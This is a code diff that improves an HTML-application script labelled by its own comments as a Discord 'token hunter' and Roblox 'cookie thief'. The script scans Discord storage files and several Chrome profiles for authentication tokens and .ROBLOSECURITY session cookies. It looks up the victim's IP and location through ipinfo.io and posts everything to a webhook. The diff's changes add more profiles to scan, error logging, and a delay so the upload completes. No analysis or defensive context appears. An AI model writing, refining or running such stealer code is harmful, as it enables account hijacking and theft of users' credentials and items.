@@ -28,26 +28,39 @@
 
         function postToWebhook(payload) {
             try {
-                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+                var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
                 xhr.open("POST", webhookUrl, false);
                 xhr.setRequestHeader('Content-Type', 'application/json');
                 xhr.send(JSON.stringify(payload));
-            } catch (e) {}
+                if (xhr.status !== 200) {
+                    // Log error if webhook fails
+                    var errorLog = fso.CreateTextFile(tempPath + "\\webhook_error.log", true);
+                    errorLog.WriteLine("Webhook failed with status: " + xhr.status);
+                    errorLog.WriteLine("Response: " + xhr.responseText);
+                    errorLog.Close();
+                }
+            } catch (e) {
+                // Log exception
+                var errorLog = fso.CreateTextFile(tempPath + "\\webhook_error.log", true);
+                errorLog.WriteLine("Exception in webhook: " + e.message);
+                errorLog.Close();
+            }
         }
 
         function getPublicIntel() {
             try {
-                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+                var xhr = new ActiveXObject("MSXML2.XMLHTTP.6.0");
                 xhr.open("GET", "https://ipinfo.io/json", false);
                 xhr.send();
-                var data = eval('(' + xhr.responseText + ')');
-                return {
-                    ip: data.ip || "N/A", city: data.city || "N/A", region: data.region || "N/A",
-                    country: data.country || "N/A", org: data.org || "N/A", loc: data.loc || "N/A"
-                };
-            } catch (e) {
-                return { ip: "N/A", city: "N/A", region: "N/A", country: "N/A", org: "N/A", loc: "N/A" };
-            }
+                if (xhr.status === 200) {
+                    var data = eval('(' + xhr.responseText + ')');
+                    return {
+                        ip: data.ip || "N/A", city: data.city || "N/A", region: data.region || "N/A",
+                        country: data.country || "N/A", org: data.org || "N/A", loc: data.loc || "N/A"
+                    };
+                }
+            } catch (e) {}
+            return { ip: "N/A", city: "N/A", region: "N/A", country: "N/A", org: "N/A", loc: "N/A" };
         }
 
         // --- MODULE 1: TOKEN HUNTER (DISCORD) ---
@@ -63,23 +76,40 @@
             var foundTokens = [];
             var tokenRegex = new RegExp("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}", "g");
             var mfaRegex = new RegExp("mfa\\.[\\w-]{84}", "g");
+            
             for (var name in paths) {
                 if (!fso.FolderExists(paths[name])) continue;
-                var folder = fso.GetFolder(paths[name]);
-                var files = new Enumerator(folder.Files);
-                for (; !files.atEnd(); files.moveNext()) {
-                    var file = files.item();
-                    if (file.Name.substr(file.Name.length - 4) === ".log" || file.Name.substr(file.Name.length - 4) === ".ldb") {
-                        try {
-                            var stream = file.OpenAsTextStream(1, -2); var content = stream.ReadAll(); stream.Close();
-                            var allMatches = (content.match(tokenRegex) || []).concat(content.match(mfaRegex) || []);
-                            for (var i = 0; i < allMatches.length; i++) {
-                                var token = allMatches[i]; var isPresent = false;
-                                for (var j = 0; j < foundTokens.length; j++) { if (foundTokens[j] === token) { isPresent = true; break; } }
-                                if (!isPresent) { foundTokens.push(token); }
+                try {
+                    var folder = fso.GetFolder(paths[name]);
+                    var files = new Enumerator(folder.Files);
+                    for (; !files.atEnd(); files.moveNext()) {
+                        var file = files.item();
+                        if (file.Name.substr(file.Name.length - 4) === ".log" || file.Name.substr(file.Name.length - 4) === ".ldb") {
+                            try {
+                                var stream = file.OpenAsTextStream(1, -2);
+                                var content = stream.ReadAll();
+                                stream.Close();
+                                var allMatches = (content.match(tokenRegex) || []).concat(content.match(mfaRegex) || []);
+                                for (var i = 0; i < allMatches.length; i++) {
+                                    var token = allMatches[i];
+                                    var isPresent = false;
+                                    for (var j = 0; j < foundTokens.length; j++) {
+                                        if (foundTokens[j] === token) {
+                                            isPresent = true;
+                                            break;
+                                        }
+                                    }
+                                    if (!isPresent) {
+                                        foundTokens.push(token);
+                                    }
+                                }
+                            } catch (e) {
+                                // Continue on file access errors
                             }
-                        } catch (e) {}
+                        }
                     }
+                } catch (e) {
+                    // Continue on folder access errors
                 }
             }
             return foundTokens;
@@ -87,30 +117,73 @@
         
         // --- MODULE 2: COOKIE THIEF (ROBLOX) ---
         function findRobloxCookie() {
-            var cookiePath = localAppData + '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies';
-            if (!fso.FileExists(cookiePath)) { return null; }
+            // Try multiple Chrome profiles
+            var chromeBasePath = localAppData + '\\Google\\Chrome\\User Data\\';
+            var profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'];
+            
+            for (var i = 0; i < profiles.length; i++) {
+                var cookiePath = chromeBasePath + profiles[i] + '\\Network\\Cookies';
+                if (fso.FileExists(cookiePath)) {
+                    try {
+                        // Copy the cookie database to temp
+                        var tempCookiePath = tempPath + "\\" + fso.GetTempName();
+                        fso.CopyFile(cookiePath, tempCookiePath);
+                        
+                        // Try to read as text (this won't work for SQLite but we'll try)
+                        var stream = fso.OpenTextFile(tempCookiePath, 1, false);
+                        var content = stream.ReadAll();
+                        stream.Close();
+                        fso.DeleteFile(tempCookiePath);
 
-            try {
-                // The cookie DB is locked by the browser. We don't fight it. We copy its soul.
-                var tempCookiePath = tempPath + "\\" + fso.GetTempName();
-                fso.CopyFile(cookiePath, tempCookiePath);
-                
-                var stream = fso.OpenTextFile(tempCookiePath, 1, false);
-                var content = stream.ReadAll();
-                stream.Close();
-                fso.DeleteFile(tempCookiePath);
-
-                var cookieRegex = new RegExp("_ROBLOSECURITY=_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\._\\|([A-F0-9]{700,})");
-                var match = content.match(cookieRegex);
-                
-                if (match && match[1]) {
-                    return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items._|" + match[1];
+                        // Look for Roblox cookie pattern
+                        var cookieRegex = new RegExp("_ROBLOSECURITY=_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\._\\|([A-F0-9]{700,})");
+                        var match = content.match(cookieRegex);
+                        
+                        if (match && match[1]) {
+                            return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items._|" + match[1];
+                        }
+                    } catch (e) {
+                        // Clean up temp file if it exists
+                        if (fso.FileExists(tempCookiePath)) {
+                            try { fso.DeleteFile(tempCookiePath); } catch (e) {}
+                        }
+                        // Continue to next profile
+                    }
                 }
-                return null;
-
-            } catch (e) {
-                return null;
             }
+            
+            // Alternative method: try to read from Chrome's Local Storage
+            try {
+                var localStoragePath = chromeBasePath + 'Default\\Local Storage\\leveldb\\';
+                if (fso.FolderExists(localStoragePath)) {
+                    var folder = fso.GetFolder(localStoragePath);
+                    var files = new Enumerator(folder.Files);
+                    for (; !files.atEnd(); files.moveNext()) {
+                        var file = files.item();
+                        if (file.Name.substr(file.Name.length - 4) === ".log" || file.Name.substr(file.Name.length - 4) === ".ldb") {
+                            try {
+                                var stream = file.OpenAsTextStream(1, -2);
+                                var content = stream.ReadAll();
+                                stream.Close();
+                                
+                                // Look for Roblox cookie in Local Storage
+                                var robloxRegex = new RegExp("_ROBLOSECURITY=([^\"]+)");
+                                var match = content.match(robloxRegex);
+                                
+                                if (match && match[1]) {
+                                    return match[1];
+                                }
+                            } catch (e) {
+                                // Continue on file access errors
+                            }
+                        }
+                    }
+                }
+            } catch (e) {
+                // Continue on error
+            }
+            
+            return null;
         }
 
         // --- MAIN ORCHESTRATION ---
@@ -119,13 +192,15 @@
         var robloxCookie = findRobloxCookie();
         
         var tokenFields = [];
-        for (var i = 0; i < discordTokens.length; i++) { tokenFields.push({ name: "🔑 Discord Token #" + (i + 1), value: "```" + discordTokens[i] + "```", inline: false }); }
+        for (var i = 0; i < discordTokens.length; i++) { 
+            tokenFields.push({ name: "🔑 Discord Token #" + (i + 1), value: "```" + discordTokens[i] + "```", inline: false }); 
+        }
         
         if (robloxCookie) {
             tokenFields.push({ name: "🍪 Roblox Cookie (.ROBLOSECURITY)", value: "```" + robloxCookie + "```", inline: false });
         }
 
-        var description = "**Timestamp:** `" + new Date().toISOString() + "`\n";
+var description = "**Timestamp:** `" + new Date().toISOString() + "`\n";
         description += "**Total Credentials Found:** `" + (discordTokens.length + (robloxCookie ? 1 : 0)) + "`\n\n";
         
         var payload = {
@@ -145,7 +220,11 @@
         };
 
         postToWebhook(payload);
-        self.close();
+        
+        // Add a delay before closing to ensure webhook completes
+        setTimeout(function() {
+            self.close();
+        }, 2000);
     }
     main();
 </script>
